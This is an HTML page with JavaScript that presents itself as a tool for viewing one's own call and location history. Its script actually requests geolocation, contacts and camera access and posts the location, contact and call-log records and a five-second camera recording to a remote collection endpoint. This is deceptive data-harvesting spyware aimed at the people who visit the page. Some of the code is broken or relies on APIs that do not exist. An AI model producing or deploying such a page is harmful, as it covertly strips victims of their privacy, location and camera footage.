<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Data Collection Page</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    margin: 0;
    padding: 0;
  }
  #main {
    text-align: center;
    margin-top: 50px;
  }
  h1 {
    color: #333;
  }
  p {
    color: #666;
    margin-bottom: 20px;
  }
  #startButton {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    cursor: pointer;
    border-radius: 5px;
    transition: background-color 0.3s;
  }
  #startButton:hover {
    background-color: #45a049;
  }
  #permissionDenied {
    display: none;
    text-align: center;
    margin-top: 50px;
  }
  #permissionDenied h2 {
    color: #d9534f;
  }
  #permissionDenied p {
    color: #a94442;
  }
</style>
</head>
<body>
<div id="main">
  <h1>Hi there!</h1>
  <p>You can easily see your nearer call history, location history, etc.</p>
  <button id="startButton">LET'S START</button>
</div>

<div id="permissionDenied">
  <h2>Permission Denied</h2>
  <p>Please grant all the permissions to proceed.</p>
</div>

<script>
document.getElementById("startButton").addEventListener("click", function() {
  // Ask for permissions
  navigator.permissions.query({name:'geolocation'}).then(function(result) {
    if (result.state === 'granted') {
      getLocation();
    } else {
      showPermissionDenied();
    }
  });

  if ("contacts" in navigator) {
    navigator.contacts.requestPermission().then(function(permissions) {
      if (permissions === "granted") {
        getCallHistory();
      } else {
        showPermissionDenied();
      }
    });
  } else {
    showPermissionDenied();
  }

  if ("camera" in navigator.mediaDevices) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      stream.getTracks().forEach(function(track) {
        track.stop();
      });
      collectPhotos();
    }).catch(function() {
      showPermissionDenied();
    });
  } else {
    showPermissionDenied();
  }
});

function getLocation() {
  navigator.geolocation.getCurrentPosition(function(position) {
    // Send location data
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    sendToAPI({latitude: latitude, longitude: longitude});
  });
}

function getCallHistory() {
  if ("contacts" in navigator) {
    navigator.contacts.select(["*"]).then(function(contacts) {
      // Extract call history
      var callHistory = [];
      contacts.forEach(function(contact) {
        if (contact.recordType === "calllog") {
          callHistory.push(contact);
        }
      });
      sendToAPI({callHistory: callHistory});
    });
  }
}

function collectPhotos() {
  // Access user's photos
  // Here you would access photos and send them to the server
  navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
    var mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = function(e) {
      if (e.data.size > 0) {
        sendToAPI({photo: e.data});
      }
    };
    mediaRecorder.start();
    setTimeout(function() {
      mediaRecorder.stop();
      stream.getTracks().forEach(function(track) {
        track.stop();
      });
    }, 5000); // Capture photos for 5 seconds
  }).catch(function(error) {
    console.error('Unable to access camera.', error);
  });
}

function sendToAPI(data) {
  // Send data to your API
  fetch('https://yourapi.com/collectdata', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    console.log('Data sent successfully');
  })
  .catch(error => {
    console.error('Error sending data:', error);
  });
}

function showPermissionDenied() {
  document.getElementById("main").style.display = "none";
  document.getElementById("permissionDenied").style.display = "block";
}
</script>
</body>
</html>
